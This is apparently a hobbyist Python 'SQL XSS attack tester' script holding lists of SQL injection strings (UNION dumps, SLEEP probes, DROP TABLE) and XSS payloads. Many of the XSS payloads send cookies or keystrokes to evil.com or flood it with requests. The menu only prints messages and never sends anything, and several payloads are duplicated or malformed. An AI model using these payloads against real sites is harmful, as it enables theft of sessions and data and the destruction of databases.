#############################################################################№
#                                                                            #
#    ____   ___  _      __  ______ ____       _  _____  _    ____ _  __      #
#   / ___| / _ \| |     \ \/ / ___/ ___|     / \|_   _|/ \  / ___| |/ /      #
#   \___ \| | | | |      \  /\___ \___ \    / _ \ | | / _ \| |   | ' /       #
#    ___) | |_| | |___   /  \ ___) |__) |  / ___ \| |/ ___ \ |___| . \\      #
#   |____/ \__\_\_____|_/_/\_\____/____/  /_/   \_\_/_/   \_\____|_|\_\\     #
#   |_   _| ____/ ___|_   _| ____|  _ \\                                     #
#     | | |  _| \___ \ | | |  _| | |_) |                                     #
#     | | | |___ ___) || | | |___|  _ <                                      #
#     |_| |_____|____/ |_| |_____|_| \\_\\                                   #
#                                                                            #
#   script.py                                                                #
#   Author: @artemko-ua                                                      #
#   Version: 0.0.2 (beta-built)                                              #
#   GitHub: https://github.com/artemko-ua                                    #
#                                                                            #
#############################################################################№

sql_injection_data = [
    "' OR 1=1 --",
    "' UNION SELECT * FROM users --",
    "' AND 1=SLEEP(5) --",
    "'); DROP TABLE users; --",
    "' UNION SELECT * FROM comments WHERE comment LIKE '%<%' --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 --",
    "' UNION SELECT * FROM users WHERE username='admin' AND 1633781711=COALESCE((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='useragent'),0) --",
    "' AND SLEEP(5) --",
    "' AND 1=1 --",
    "' UNION SELECT (SELECT COUNT(*) FROM users WHERE username='admin') --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='admin')>0 --",
    "' UNION SELECT * FROM users WHERE username LIKE '%' --",
    "' UNION SELECT * FROM users WHERE LOWER(username)=LOWER('admin') --",
    "' UNION SELECT * FROM users WHERE username='admin' --",
    "' OR 1=1 --",
    "' UNION SELECT * FROM users WHERE username='admin'--",
    "' UNION SELECT * FROM users WHERE username='admin' --",
    "' UNION SELECT * FROM users WHERE username='admin' AND 1633781711=COALESCE((SELECT COUNT(*) FROM information_schema.tables WHERE table_name='useragent'),0) --",
    "'); DROP TABLE users; --",
    "' UNION SELECT * FROM comments WHERE comment LIKE '%<%' --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --",
    "' UNION SELECT (SELECT COUNT(*) FROM users WHERE username='admin') --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin')>0 --",
    "' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='password')>0 AND (SELECT COUNT(*) FROM users WHERE username='admin' AND password='admin')>0 --",
    "' UNION SELECT * FROM users WHERE username LIKE '%' --",
    "' UNION SELECT * FROM users WHERE username='admin' AND password IS NULL --",
    "' UNION SELECT * FROM users WHERE username='admin' AND LENGTH(password)<10 --"
]

xss_attacks = [
    "<script>alert(document.cookie)</script>",
    "<script>document.location='http://evil.com/steal?cookie='+document.cookie</script>",
    "<script>document.onkeypress = function (e) { fetch('http://evil.com/log?key='+e.key) };</script>",
    "<img src=\"http://evil.com/steal?cookie=\"+document.cookie>",
    "<script>window.location.replace(\"http://evil.com/steal?cookie=\"+document.cookie);</script>",
    "<script>alert('Click me to steal cookies: '+document.cookie);</script>",
    "<script>while(true){fetch('http://evil.com/ddos?cookie='+document.cookie);}</script>",
    "<script>fetch('http://evil.com/malware?cookie='+document.cookie);</script>",
    "<script>while(true){fetch('http://evil.com/spam?cookie='+document.cookie);}</script>",
    "<script>fetch('http://evil.com/hijack?cookie='+document.cookie);</script>",
    "<iframe src=\"http://evil.com/clickjack?cookie=\"+document.cookie></iframe>",
    "<a href=\"http://evil.com/download?cookie=\"+document.cookie>Download</a>",
    "<input type=\"file\" onchange=\"fetch('http://evil.com/upload?cookie='+document.cookie)\">",
    "<form action=\"http://evil.com/submit?cookie=\"+document.cookie></form>",
    "<input type=\"image\" src=\"http://evil.com/upload?cookie=\"+document.cookie>",
    "<video src=\"http://evil.com/video?cookie=\"+document.cookie></video>",
    "<script>fetch('http://evil.com/escalate?cookie='+document.cookie);</script>",
    "<script>for(var i=0;i<65535;i++){fetch('http://evil.com/scan?port='+i+'&cookie='+document.cookie);}</script>",
    "<img src=\"http://evil.com/reflect?cookie=\"+document.cookie>",
    "<script>alert(document.cookie)</script>",
    "<input type=\"text\" value=\"<script>alert(document.cookie)</script>\">",
    "<!-- <script>alert(document.cookie)</script> -->",
    "<script>var x = \"<script>alert(document.cookie)</script>\";</script>",
    "<script>var obj = {x: \"<script>alert(document.cookie)</script>\"};</script>",
    "<script>var arr = [\"<script>alert(document.cookie)</script>\"];</script>",
    "<script>function x() { alert(document.cookie); }</script>",
    "<button onclick=\"alert(document.cookie)\">Click Me</button>",
    "<script>location.href = \"http://evil.com/?cookie=\" + document.cookie;</script>"
]

ascii_art = '''\
 ____   ___  _      __  ______ ____       _  _____  _    ____ _  __
/ ___| / _ \| |     \ \/ / ___/ ___|     / \|_   _|/ \  / ___| |/ /
\___ \| | | | |      \  /\___ \___ \    / _ \ | | / _ \| |   | ' / 
 ___) | |_| | |___   /  \ ___) |__) |  / ___ \| |/ ___ \ |___| . \\ 
|____/ \__\_\_____|_/_/\_\____/____/  /_/   \_\_/_/   \_\____|_|\_\\
|_   _| ____/ ___|_   _| ____|  _ \\                                
  | | |  _| \___ \ | | |  _| | |_) |                               
  | | | |___ ___) || | | |___|  _ <                                
  |_| |_____|____/ |_| |_____|_| \\_\\                               
'''

print(ascii_art)

print("""
Usage: script.py [OPTIONS]

Options:
  -h, --help     Display help information.
  -s, --sql      Enable SQL injection mode.
  -x, --xss      Enable XSS attack mode.
  -m, --multi    Enable multi-mode (SQL injection and XSS attacks).
  -e, --exit     Gracefully exit the script.
  -p, --payload  Specify specific attacking payloads (e.g., SQL queries or XSS scripts) to be used during the attack.
""")



def mode_chose(_mode):
    if _mode in ("-h", "--help"):
        print("Usage: script.py [OPTIONS]")
        print("  -h, --help     Display help information.")
        print("  -s, --sql      Enable SQL injection mode.")
        print("  -x, --xss      Enable XSS attack mode.")
        print("  -m, --multi    Enable multi-mode (SQL injection and XSS attacks).")
        print("  -e, --exit     Gracefully exit the script.")
    elif _mode in ("-s", "--sql"):
        print("SQL injection mode activated.")
    elif _mode in ("-x", "--xss"):
        print("XSS attack mode activated.")
    elif _mode in ("-m", "--multi"):
        print("Multi-mode (SQL injection and XSS attacks) activated.")
    elif _mode in ("-e", "--exit"):
        print("Exiting the script gracefully.")
        exit() 

while True:
    mode = input("Choose mode: ")
    mode_chose(mode)
